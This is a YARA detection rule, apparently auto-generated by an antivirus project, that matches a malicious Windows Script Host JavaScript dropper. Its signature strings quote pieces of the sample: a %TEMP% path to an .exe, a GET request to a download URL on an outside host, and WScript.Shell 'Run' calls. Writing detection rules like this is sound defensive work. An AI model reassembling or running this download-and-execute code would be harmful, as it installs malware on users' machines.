rule sig_20160328_55d74a7c9636509be75c5f1c8bdad4e0 {
  meta:
    description = "datamaliciousorder - file 20160328_55d74a7c9636509be75c5f1c8bdad4e0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0983e587267dfdf11fc08a4a043b5699b1df706d36483bd04b0d9f82c66501b2"

  strings:
    $s1  = "function Jrezzf() {return Dzgrscypi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"sI4daqyzG8u.exe\";};" fullword ascii
    $s2  = "Pdzqydzx[Nvhjzdhuev](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Aetnuawfv](Kczdntm() * 11)} while (Pdzqydzx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Qvfnk(Qofbjogjhx, Tgdnzd){return Qofbjogjhx - Tgdnzd;};" fullword ascii
    $s5  = "var Dzgrscypi = function Qhfpidpb() {return WScript[Ivpkn](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Mpiag() {return ((Higrw == true) && (Higrw == Roqgx)) ? 1 : Myloqsr;};" fullword ascii
    $s7  = "function Cgtvieo(Ygjzyz){Dzgrscypi[\"Run\"](Ygjzyz, Myloqsr, Myloqsr);};" fullword ascii
    $s8  = "var Roqgx = false;" fullword ascii
    $s9  = "function Kczdntm(){return 22;};" fullword ascii
    $s10 = "return Qvfnk(Lbvkpecglo, Axcmnaa);" fullword ascii
    $s11 = " while (Jjpfqcpj){" fullword ascii
    $s12 = "Roqgx = true; " fullword ascii
    $s13 = "function Fkstoq(){return Ivpkn;};" fullword ascii
    $s14 = "function Yxsug()" fullword ascii
    $s15 = "function Aorhe(Amqnsqjaaj) {var Rxsrn = (1, 2, 3, 4, 5, Amqnsqjaaj); return Rxsrn;};" fullword ascii
    $s16 = "var Higrw = false;" fullword ascii
    $s17 = "Higrw = true; " fullword ascii
    $s18 = "function Ryparojyu(){return Jirod;};" fullword ascii
    $s19 = "var Zwxljrb = new this[\"Date\"]();" fullword ascii
    $s20 = "var Bcamraxxy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}